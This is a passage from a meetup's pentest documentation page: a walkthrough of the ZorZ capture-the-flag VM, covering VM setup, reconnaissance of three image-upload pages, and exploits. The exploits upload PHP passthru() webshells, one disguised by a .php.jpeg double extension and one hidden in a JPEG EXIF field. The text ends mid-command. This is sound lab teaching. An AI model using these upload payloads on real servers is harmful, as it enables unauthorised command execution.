

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.19. ZorZ &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="3.20. Vulnix" href="vulnix.html" />
    <link rel="prev" title="3.18. Freshly" href="freshly.html" /> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.19. ZorZ</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#setup">3.19.1. Setup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vmware-vm">3.19.1.1. Setting up the VMware VM</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#attacking-http">3.19.2. Attacking HTTP</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#real-reconnaissance-vs-documenting-the-attack">3.19.2.1. Real Reconnaissance vs. Documenting the Attack</a></li>
<li class="toctree-l4"><a class="reference internal" href="#http-reconnaissance-3-upload-pages">3.19.2.2. HTTP Reconnaissance - 3 Upload Pages</a></li>
<li class="toctree-l4"><a class="reference internal" href="#upload-1-expoit">3.19.2.3. Upload 1 Expoit</a></li>
<li class="toctree-l4"><a class="reference internal" href="#upload-2-expoit">3.19.2.4. Upload 2 Expoit</a></li>
<li class="toctree-l4"><a class="reference internal" href="#upload-3-expoit">3.19.2.5. Upload 3 Expoit</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.19. ZorZ</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/zorz.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="zorz">
<span id="id21"></span><h1>3.19. ZorZ<a class="headerlink" href="#zorz" title="Permalink to this headline">¶</a></h1>
<div class="section" id="setup">
<h2>3.19.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://www.vulnhub.com/entry/tophatsec-zorz%2c117/#">TopHatSec: ZorZ</a>:</p>
<blockquote>
<div><p>ZORZ is another VM that will challenge your webapp skills. There are 3 separate challenges (web pages) on this machine. It should be pretty straight forward. I have explained as much as I can in the readme file:</p>
<p>Welcome to the ZorZ VM Challenge</p>
<p>This machine will probably test your web app skills once again. There are 3 different pages that should be focused on (you will see!) If you solve one or all three pages, please send me an email and quick write up on how you solved each challenge. Your goal is to successfully upload a webshell or malicious file to the server. If you can execute system commands on this box, thats good enough!!! I hope you have fun!</p>
<p><a class="reference external" href="mailto:admin&#37;&#52;&#48;top-hat-sec&#46;com">admin<span>&#64;</span>top-hat-sec<span>&#46;</span>com</a></p>
<p>VulnHub note: You may have issues when importing to VMware. If this is the case. extract the HDD from the OVA file (using something like 7zip), and attach to a new VM. Please see the following guide: <a class="reference external" href="https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/">https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/</a>.</p>
</div></blockquote>
<p><a class="reference external" href="http://www.rebootuser.com/?page_id=1721">Rebootuser - Local Linux Enumeration &amp; Privilege Escalation</a> shows techniques/hints.</p>
<div class="section" id="setting-up-the-vmware-vm">
<h3>3.19.1.1. Setting up the VMware VM<a class="headerlink" href="#setting-up-the-vmware-vm" title="Permalink to this headline">¶</a></h3>
<p>The VM comes packaged as <a class="reference external" href="http://download.vulnhub.com/tophatsec/Zorz.ova">Zorz.ova</a>, which is a tar archive containing a VMware vmdk file.</p>
<p>See <a class="reference internal" href="VWADP.html#vmsetup"><span class="std std-ref">Traditional VM challenge setup</span></a> for background on using the VMware vmdk file. ZorZ is Ubuntu 14.04, x86, and 1024MB memory. For KVM you can use a backing store to undo any changes to the disk:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="nv">BACKING</span><span class="o">=</span>Zorz-disk1.vmdk
<span class="nv">VM_DISK</span><span class="o">=</span>Zorz-changes.qcow2
curl --remote-name http://download.vulnhub.com/tophatsec/Zorz.ova
tar -xvf Zorz.ova
<span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="nv">$BACKING</span>  <span class="nv">$VM_DISK</span>
<span class="nv">$SUDO</span> qemu-img info <span class="nv">$BACKING</span>
<span class="nv">$SUDO</span> qemu-img info <span class="nv">$VM_DISK</span>
<span class="c1"># To revert to original image</span>
<span class="c1"># $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK</span>
</pre></div>
</div>
<p>Then Linux KVM could use the VM_DISK to create the ZorZ VM. The actual command the author used in Debian Linux to create the VM was (os-variant=ubuntutrusty was not supported on Debian Jessie at this time):</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">VM</span><span class="o">=</span>ZorZ
<span class="nv">$SUDO</span> virt-install <span class="se">\</span>
    --name <span class="s2">&quot;ZorZ&quot;</span> --cpu host --vcpus <span class="m">1</span> --ram <span class="m">1024</span> <span class="se">\</span>
    --os-type<span class="o">=</span>linux --os-variant<span class="o">=</span>ubuntuprecise <span class="se">\</span>
    --disk <span class="nv">path</span><span class="o">=</span><span class="nv">$VM_DISK</span> <span class="se">\</span>
    --noautoconsole <span class="se">\</span>
    --accelerate --hvm <span class="se">\</span>
    --import
<span class="c1">#    --console pty,target_type=virtio \</span>
<span class="c1"># Useful commands:</span>
<span class="c1"># $SUDO virsh help</span>
<span class="c1"># $SUDO virsh list --all</span>
<span class="c1"># $SUDO virsh destroy --graceful $VM</span>
<span class="c1"># $SUDO virsh start $VM</span>
<span class="c1"># $SUDO virsh reboot $VM</span>
<span class="c1"># $SUDO virsh shutdown $VM</span>
<span class="c1"># $SUDO virsh undefine [--wipe-storage] $VM</span>
<span class="c1"># $SUDO virsh undefine $VM</span>
<span class="c1"># $SUDO virsh help destroy</span>
<span class="c1">#</span>
</pre></div>
</div>
<p>So if ZorZ were running and you wanted to “start over again”:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> virsh shutdown <span class="nv">$VM</span>
<span class="nv">$SUDO</span> virsh undefine <span class="nv">$VM</span>
<span class="nv">$SUDO</span> qemu-img create -f qcow2 -o <span class="nv">backing_file</span><span class="o">=</span><span class="nv">$BACKING</span>  <span class="nv">$VM_DISK</span>
<span class="nv">$SUDO</span> virt-install <span class="se">\</span>
    --name <span class="s2">&quot;ZorZ&quot;</span> --cpu host --vcpus <span class="m">1</span> --ram <span class="m">512</span> <span class="se">\</span>
    --os-type<span class="o">=</span>linux --os-variant<span class="o">=</span>ubuntuprecise <span class="se">\</span>
    --disk <span class="nv">path</span><span class="o">=</span><span class="nv">$VM_DISK</span> <span class="se">\</span>
    --noautoconsole <span class="se">\</span>
    --accelerate --hvm <span class="se">\</span>
    --import
</pre></div>
</div>
</div>
</div>
<div class="section" id="attacking-http">
<h2>3.19.2. Attacking HTTP<a class="headerlink" href="#attacking-http" title="Permalink to this headline">¶</a></h2>
<div class="section" id="real-reconnaissance-vs-documenting-the-attack">
<h3>3.19.2.1. Real Reconnaissance vs. Documenting the Attack<a class="headerlink" href="#real-reconnaissance-vs-documenting-the-attack" title="Permalink to this headline">¶</a></h3>
<p>Here we focus on documenting the attack and rely on command line tools. That has several advantages: it’s easier to document (no screen shots required); it’s easier to repeat (simply cut-and-paste the input lines into a terminal session); prepares the user for command-line-only situations; and doesn’t suffer from the “how do I do it in IE/chrome/firefox” questions.</p>
<p>However, when you first approach a web challenge it’s much, much easier to use a web browser and its tools to view the pages. Additionally, using an intercepting proxy like <a class="reference external" href="http://portswigger.net/burp/">Burp Suite</a> or <a class="reference external" href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">ZAP</a> allows easier investigation. Once you’ve used the GUI you can often translate that to a command line solution; this fails in those cases where a browser is required (i.e. client-side Javascript).</p>
</div>
<div class="section" id="http-reconnaissance-3-upload-pages">
<h3>3.19.2.2. HTTP Reconnaissance - 3 Upload Pages<a class="headerlink" href="#http-reconnaissance-3-upload-pages" title="Permalink to this headline">¶</a></h3>
<p>Since this is a web exercise we’ll skip using <code class="docutils literal notranslate"><span class="pre">enumerator</span></code> and proceed directly with web page reconnaissance.</p>
<div class="section" id="upload-1-web-page">
<h4>3.19.2.2.1. Upload 1 Web Page<a class="headerlink" href="#upload-1-web-page" title="Permalink to this headline">¶</a></h4>
<p>Fetching the web page we see:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> curl --silent --output upload1.html http://<span class="nv">$IP</span>/
<span class="gp">hacker@kali:~$</span> cat upload1.html
<span class="go">&lt;!DOCTYPE html&gt;</span>
<span class="go">&lt;html&gt;</span>
<span class="go">&lt;body&gt;</span>
<span class="go">&lt;center&gt;</span>
<span class="go">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="go">&lt;form action=&quot;uploader.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span>
<span class="go">        &lt;b&gt;ZorZ Image Uploader!:&lt;/b&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="go">        &lt;input type=&quot;file&quot; name=&quot;upfile&quot; id=&quot;upfile&quot;&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="go">        &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;</span>
<span class="go">&lt;/form&gt;</span>
<span class="go">&lt;br&gt;&lt;a href=&quot;index2.html&quot;&gt;Try ZorZ Image Uploader2!&lt;/a&gt;</span>
<span class="go">&lt;/center&gt;</span>
<span class="go">&lt;/body&gt;</span>
<span class="go">&lt;/html&gt;</span>

<span class="gp">hacker@kali:~$ #</span> see <span class="s2">&quot;index2.html&quot;</span> exists so fetch it
</pre></div>
</div>
</div>
<div class="section" id="upload-2-web-page">
<h4>3.19.2.2.2. Upload 2 Web Page<a class="headerlink" href="#upload-2-web-page" title="Permalink to this headline">¶</a></h4>
<p>There’s another upload web page at <a class="reference external" href="http://$IP/index2.html">http://$IP/index2.html</a>:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> curl --silent --output upload2.html http://<span class="nv">$IP</span>/index2.html
<span class="gp">hacker@kali:~$</span> cat upload2.html
<span class="go">&lt;!DOCTYPE html&gt;</span>
<span class="go">&lt;html&gt;</span>
<span class="go">&lt;title&gt;ZorZ Uploader 2&lt;/title&gt;</span>
<span class="go">&lt;body&gt;</span>
<span class="go">&lt;center&gt;</span>
<span class="go">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="go">&lt;form action=&quot;uploader2.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span>
<span class="go">        &lt;b&gt;ZorZ Image Uploader 2!:&lt;/b&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="go">        &lt;input type=&quot;file&quot; name=&quot;upfile&quot; id=&quot;upfile&quot;&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="go">        &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;</span>
<span class="go">&lt;/form&gt;</span>
<span class="go">&lt;br&gt;&lt;br&gt;&lt;a href=&quot;index.html&quot;&gt;ZorZ Image Uploader 1&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;/jQuery/upload.php&quot;&gt;ZorZ Image Uploader3&lt;/a&gt;</span>
<span class="go">&lt;/center&gt;</span>
<span class="go">&lt;/body&gt;</span>
<span class="go">&lt;/html&gt;</span>

<span class="gp">hacker@kali:~$ #</span> see <span class="s2">&quot;/jQuery/upload.php&quot;</span> exists so fetch it
</pre></div>
</div>
</div>
<div class="section" id="upload-3-web-page">
<h4>3.19.2.2.3. Upload 3 Web Page<a class="headerlink" href="#upload-3-web-page" title="Permalink to this headline">¶</a></h4>
<p>There’s yet another upload web page at <a class="reference external" href="http://$IP/jQuery/upload.php">http://$IP/jQuery/upload.php</a>:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> curl --silent --output upload3.html http://<span class="nv">$IP</span>/jQuery/upload.php
<span class="gp">hacker@kali:~$</span> cat upload3.html



<span class="go">&lt;!DOCTYPE html&gt;</span>
<span class="go">&lt;html&gt;</span>
<span class="go">&lt;head&gt;</span>
<span class="go">&lt;title&gt;ZorZ Uploader3&lt;/title&gt;</span>
<span class="go">&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot;&gt;</span>
<span class="go">&lt;script src=&quot;http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js&quot;&gt;&lt;/script&gt;</span>
<span class="go">&lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;</span>
<span class="go">&lt;/head&gt;</span>
<span class="go">&lt;body&gt;</span>
<span class="go">&lt;div id=&quot;mainform&quot;&gt;</span>
<span class="go">&lt;div id=&quot;innerdiv&quot;&gt;</span>
<span class="go">&lt;h2&gt;ZorZ Image Uploader3!&lt;/h2&gt;</span>
<span class="go">&lt;!-- Required Div Starts Here --&gt;</span>
<span class="go">&lt;div id=&quot;formdiv&quot;&gt;</span>
<span class="go">&lt;h3&gt;Upload Form&lt;/h3&gt;</span>
<span class="go">&lt;form action=&quot;&quot; enctype=&quot;multipart/form-data&quot; id=&quot;form&quot; method=&quot;post&quot; name=&quot;form&quot;&gt;</span>
<span class="go">&lt;div id=&quot;upload&quot;&gt;</span>
<span class="go">&lt;input id=&quot;file&quot; name=&quot;file&quot; type=&quot;file&quot;&gt;</span>
<span class="go">&lt;/div&gt;</span>
<span class="go">&lt;input id=&quot;submit&quot; name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span>
<span class="go">&lt;/form&gt;</span>
<span class="go">&lt;div id=&quot;detail&quot;&gt;</span>
<span class="go">&lt;b&gt;Note:&lt;/b&gt;</span>
<span class="go">&lt;ul&gt;</span>
<span class="go">&lt;li&gt;&lt;&lt; Click on the white box to select file!.&lt;/li&gt;</span>
<span class="go">&lt;li&gt;&lt;b&gt;images(jpeg,jpg,png).&lt;/b&gt;&lt;/li&gt;</span>
<span class="go">&lt;li&gt;Image should be less than 100kb in size.&lt;/li&gt;</span>
<span class="go">&lt;/ul&gt;</span>
<span class="go">&lt;/div&gt;</span>
<span class="go">&lt;/div&gt;</span>
<span class="go">&lt;div id=&quot;clear&quot;&gt;&lt;/div&gt;</span>
<span class="go">&lt;div id=&quot;preview&quot;&gt;</span>
<span class="go">&lt;img id=&quot;previewimg&quot; src=&quot;&quot;&gt;&lt;img id=&quot;deleteimg&quot; src=&quot;delete.png&quot;&gt;</span>
<span class="go">&lt;span class=&quot;pre&quot;&gt;IMAGE PREVIEW&lt;/span&gt;</span>
<span class="go">&lt;/div&gt;</span>
<span class="go">&lt;div id=&quot;message&quot;&gt;</span>
<span class="go">&lt;/div&gt;</span>
<span class="go">&lt;/div&gt;</span>
<span class="go">&lt;/div&gt;</span>
<span class="go">&lt;/body&gt;</span>
<span class="go">&lt;/html&gt;</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="upload-1-expoit">
<h3>3.19.2.3. Upload 1 Expoit<a class="headerlink" href="#upload-1-expoit" title="Permalink to this headline">¶</a></h3>
<p>Basically the same approach works for all the uploads. The exploit is based on uploading a php script that lists files in /var/www (using the trick that FILE.php.jpeg is treated like a jpeg file on upload but executes like a php file when fetched). For Upload 1 the file only needs to have the filename extension be an image (jpeg); the file doesn’t actually have to be jpeg format.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">CMD</span><span class="o">=</span><span class="s2">&quot;ls -laR /var/www&quot;</span>
cat &gt; command.php.jpeg <span class="s">&lt;&lt;EOF</span>
<span class="s">&lt;?php</span>
<span class="s">passthru( &quot;$CMD&quot;);</span>
<span class="s">?&gt;</span>
<span class="s">EOF</span>
curl --silent <span class="se">\</span>
     --form <span class="nv">upfile</span><span class="o">=</span><span class="s2">&quot;@command.php.jpeg&quot;</span> <span class="se">\</span>
     --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Upload Image&quot;</span> <span class="se">\</span>
     http://<span class="nv">$IP</span>/uploader.php <span class="se">\</span>
  <span class="p">|</span> grep <span class="s1">&#39;successfully uploaded&#39;</span>
curl http://<span class="nv">$IP</span>/uploads1/command.php.jpeg
</pre></div>
</div>
<p>Running the above shows us the target file <code class="file docutils literal notranslate"><span class="pre">SECRETFILE</span></code>:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~$</span> <span class="nv">CMD</span><span class="o">=</span><span class="s2">&quot;ls -laR /var/www&quot;</span>
</span><span class="hll"><span class="gp">hacker@kali:~$</span> cat &gt; command.php.jpeg <span class="s">&lt;&lt;EOF</span>
</span><span class="gp">&gt;</span><span class="s"> &lt;?php</span>
<span class="gp">&gt;</span><span class="s"> passthru( &quot;$CMD&quot;);</span>
<span class="gp">&gt;</span><span class="s"> ?&gt;</span>
<span class="gp">&gt;</span><span class="s"> EOF</span>
<span class="hll"><span class="gp">hacker@kali:~$</span> curl --silent <span class="se">\</span>
</span><span class="hll">&gt;      --form <span class="nv">upfile</span><span class="o">=</span><span class="s2">&quot;@command.php.jpeg&quot;</span> <span class="se">\</span>
</span><span class="hll">&gt;      --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Upload Image&quot;</span> <span class="se">\</span>
</span><span class="hll">&gt;      http://<span class="nv">$IP</span>/uploader.php <span class="se">\</span>
</span><span class="hll">&gt;   <span class="p">|</span> grep <span class="s1">&#39;successfully uploaded&#39;</span>
</span><span class="go">&lt;p&gt;File is valid, and was successfully uploaded.</span>
<span class="hll"><span class="gp">hacker@kali:~$</span> curl http://<span class="nv">$IP</span>/uploads1/command.php.jpeg
</span><span class="go">/var/www:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x  3 root root 4096 Feb 17 20:44 .</span>
<span class="go">drwxr-xr-x 12 root root 4096 Feb 17 20:44 ..</span>
<span class="go">drwxr-xr-x  7 root root 4096 Feb 18 22:40 html</span>

<span class="go">/var/www/html:</span>
<span class="go">total 48</span>
<span class="go">drwxr-xr-x 7 root     root     4096 Feb 18 22:40 .</span>
<span class="go">drwxr-xr-x 3 root     root     4096 Feb 17 20:44 ..</span>
<span class="go">-rwxr-xr-x 1 www-data www-data  367 Feb 18 20:54 index.html</span>
<span class="go">-rwxr-xr-x 1 root     root      457 Feb 18 22:30 index2.html</span>
<span class="go">drwxr-xr-x 2 root     root     4096 Feb 18 22:22 jQuery</span>
<span class="go">drwxr-xr-x 2 root     root     4096 Feb 18 22:45 l337saucel337</span>
<span class="go">-rw-r--r-- 1 root     root      398 Feb 18 20:20 uploader.php</span>
<span class="go">-rw-r--r-- 1 root     root     1410 Feb 18 20:50 uploader2.php</span>
<span class="go">-rwxr-xr-x 1 root     root     1980 Feb 18 16:40 uploader3.php</span>
<span class="go">drwxr-xr-x 2 www-data www-data 4096 Apr 21 16:58 uploads1</span>
<span class="go">drwxr-xr-x 2 www-data www-data 4096 Feb 18 22:39 uploads2</span>
<span class="go">drwxr-xr-x 2 www-data root     4096 Feb 18 22:39 uploads3</span>

<span class="go">/var/www/html/jQuery:</span>
<span class="go">total 28</span>
<span class="go">drwxr-xr-x 2 root root 4096 Feb 18 22:22 .</span>
<span class="go">drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..</span>
<span class="go">-rw-r--r-- 1 root root  753 Aug  7  2009 delete.png</span>
<span class="go">-rw-r--r-- 1 root root  715 Feb 18 21:59 script.js</span>
<span class="go">-rw-r--r-- 1 root root 1714 Feb 18 22:00 style.css</span>
<span class="go">-rw-r--r-- 1 root root 1049 Feb 18 22:18 upload.php</span>
<span class="go">-rw-r--r-- 1 root root 1232 Feb 18 22:19 uploadphp.php</span>

<span class="go">/var/www/html/l337saucel337:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x 2 root root 4096 Feb 18 22:45 .</span>
<span class="go">drwxr-xr-x 7 root root 4096 Feb 18 22:40 ..</span>
<span class="hll"><span class="go">-rw-r--r-- 1 root root  400 Feb 18 22:45 SECRETFILE</span>
</span>
<span class="go">/var/www/html/uploads1:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x 2 www-data www-data 4096 Apr 21 16:58 .</span>
<span class="go">drwxr-xr-x 7 root     root     4096 Feb 18 22:40 ..</span>
<span class="go">-rw-r--r-- 1 www-data www-data   40 Apr 21 16:58 command.php.jpeg</span>

<span class="go">/var/www/html/uploads2:</span>
<span class="go">total 8</span>
<span class="go">drwxr-xr-x 2 www-data www-data 4096 Feb 18 22:39 .</span>
<span class="go">drwxr-xr-x 7 root     root     4096 Feb 18 22:40 ..</span>

<span class="go">/var/www/html/uploads3:</span>
<span class="go">total 8</span>
<span class="go">drwxr-xr-x 2 www-data root 4096 Feb 18 22:39 .</span>
<span class="go">drwxr-xr-x 7 root     root 4096 Feb 18 22:40 ..</span>
</pre></div>
</div>
<p>Now we fetch the SECRETFILE:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> curl --silent --remote-name http://<span class="nv">$IP</span>/l337saucel337/SECRETFILE
<span class="gp">hacker@kali:~$</span> cat SECRETFILE
<span class="go">Great job so far. This box has 3 uploaders.</span>

<span class="go">The first 2 are pure php, the last one is php w/jquery.</span>

<span class="go">To get credit for this challenge, please submit a write-up or instructions</span>
<span class="go">on how you compromised the uploader or uploaders. If you solve 1, 2, or all</span>
<span class="go">of the uploader challenges, feel free to shoot me an email and let me know!</span>

<span class="go">admin@top-hat-sec.com</span>

<span class="go">Thanks for playing!</span>
<span class="go">http://www.top-hat-sec.com</span>
</pre></div>
</div>
</div>
<div class="section" id="upload-2-expoit">
<h3>3.19.2.4. Upload 2 Expoit<a class="headerlink" href="#upload-2-expoit" title="Permalink to this headline">¶</a></h3>
<p>Basically the same approach as Upload 1 except that the file must really be a jpeg file. We select a jpeg file from the <a class="reference external" href="http://www.exiv2.org/">http://www.exiv2.org/</a> site. So how to get the php script into the jpeg file? Use the <code class="docutils literal notranslate"><span class="pre">exiftool</span></code> to set one of the jpeg file TAG fields (here the DocumentName) to a php script.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">JPEG</span><span class="o">=</span>trick.php.jpeg
curl --silent --output <span class="nv">$JPEG</span>  http://www.exiv2.org/include/img_1771.jpg
exiftool -DocumentName<span class="o">=</span><span class="s1">&#39;&lt;?php passthru(&quot;ls -laR /var/www&quot;); ?&gt;&#39;</span> <span class="nv">$JPEG</span>
curl --silent <span class="se">\</span>
     --form <span class="nv">upfile</span><span class="o">=</span><span class="s2">&quot;@</span><span class="nv">$JPEG</span><span class="s2">&quot;</span> <span class="se">\</span>
     --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Upload Image&quot;</span> <span class="se">\</span>
     http://<span class="nv">$IP</span>/uploader2.php <span class="se">\</span>
